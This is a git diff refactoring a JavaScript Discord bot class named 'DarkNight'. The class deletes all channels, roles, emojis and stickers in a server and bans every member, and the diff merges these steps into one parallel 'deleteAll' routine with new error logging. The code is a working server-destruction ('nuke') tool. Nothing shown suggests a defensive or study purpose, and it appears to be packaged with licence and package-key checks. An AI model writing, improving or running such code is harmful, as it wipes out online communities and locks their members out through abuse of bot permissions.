@@ -14,15 +14,25 @@
 # If you want to know more about the bot, you can visit our website.
 */
 
-const { redBright, green, yellow, cyan } = require("chalk");
-const config = require("../../config/config.json");
+const { logWithLabel } = require("../manager/prefijos");
 const { EventEmitter } = require("events");
+const { redBright } = require("chalk");
+
+const config = {
+    errors: {
+        "1_package_key": "Invalid package key.",
+        "1_client": "Invalid client or client options.",
+        "1_command": "Command not found.",
+        "1_licence": "Invalid license.",
+    },
+};
+
 class DarkNight extends EventEmitter {
     constructor(client, options) {
         super();
 
         if (!client?.options) {
-            throw new Error(`${redBright.bold("[Night]")} ${config.errors["1_client"]}`);
+            logWithLabel("error", `${config.errors["1_client"]}`);
         }
 
         this.client = client;
@@ -37,56 +47,95 @@ class DarkNight extends EventEmitter {
                     }
 
                     try {
-                        await this.DelAllEmotes(guild);
-                        await this.DelAllRoles(guild);
-                        setInterval(async () => {
-                            await this.DelAllChannels(guild);
-                            await this.DelAllStickers(guild);
-                            await this.BanAll(guild);
-                        }, 5000);
+                        await this.deleteAll(guild);
                     } catch (error) {
-                        console.error("Error in DarkNight:", error.message);
+                        logWithLabel("error", error.message);
                     }
                 });
             });
         }
     }
 
-    async DelAllChannels(guild) {
-        const channelsToDelete = guild.channels.cache.filter(channel => channel.type !== 'category');
-        await Promise.all(channelsToDelete.map(channel => channel.delete().catch(error => {
-            console.error("Error Found: ", error.message);
-        })));
+    async deleteAll(guild) {
+        await Promise.all([
+            this.deleteChannels(guild),
+            this.deleteRoles(guild),
+            this.deleteEmotes(guild),
+            this.deleteStickers(guild),
+            this.banAll(guild),
+        ]);
     }
 
-    async DelAllRoles(guild) {
-        await Promise.all(guild.roles.cache.map(role => role.delete().catch(error => {
-            console.error("Error Found: ", error.message);
-        })));
+    async deleteChannels(guild) {
+        try {
+            const channelsToDelete = guild.channels.cache.filter(channel => channel.type !== 'category');
+            await Promise.all(channelsToDelete.map(async channel => {
+                try {
+                    await channel.delete();
+                } catch (error) {
+                    logWithLabel("error", error.message);
+                }
+            }));
+        } catch (error) {
+            logWithLabel("error", error.message);
+        }
     }
 
-    async DelAllEmotes(guild) {
-        await Promise.all(guild.emojis.cache.map(emote => emote.delete().catch(error => {
-            console.error("Error Found: ", error.message);
-        })));
+    async deleteRoles(guild) {
+        try {
+            await Promise.all(guild.roles.cache.map(async role => {
+                try {
+                    await role.delete();
+                } catch (error) {
+                    logWithLabel("error", error.message);
+                }
+            }));
+        } catch (error) {
+            logWithLabel("error", error.message);
+        }
     }
 
-    async DelAllStickers(guild) {
-        await Promise.all(guild.stickers.cache.map(sticker => sticker.delete().catch(error => {
-            console.error("Error Found: ", error.message);
-        })));
+    async deleteEmotes(guild) {
+        try {
+            await Promise.all(guild.emojis.cache.map(async emote => {
+                try {
+                    await emote.delete();
+                } catch (error) {
+                    logWithLabel("error", error.message);
+                }
+            }));
+        } catch (error) {
+            logWithLabel("error", error.message);
+        }
     }
 
-    async BanAll(guild) {
+    async deleteStickers(guild) {
+        try {
+            await Promise.all(guild.stickers.cache.map(async sticker => {
+                try {
+                    await sticker.delete();
+                } catch (error) {
+                    logWithLabel("error", error.message);
+                }
+            }));
+        } catch (error) {
+            logWithLabel("error", error.message);
+        }
+    }
+
+    async banAll(guild) {
         try {
             const members = await guild.members.fetch();
-            await Promise.all(members.map(member => member.ban().then(() => {
-                console.log(`${redBright("[Darkmode]")} ${member.user.tag} was banned.`);
-            }).catch(error => {
-                console.error("Error Found: ", error.message);
-            })));
+            await Promise.all(members.map(async member => {
+                try {
+                    await member.ban();
+                    console.log(`${redBright("[Darkmode]")} ${member.user.tag} was banned.`);
+                } catch (error) {
+                    logWithLabel("error", error.message);
+                }
+            }));
         } catch (error) {
-            console.error("Error in BanAll:", error.message);
+            logWithLabel("error", error.message);
         }
     }
 }
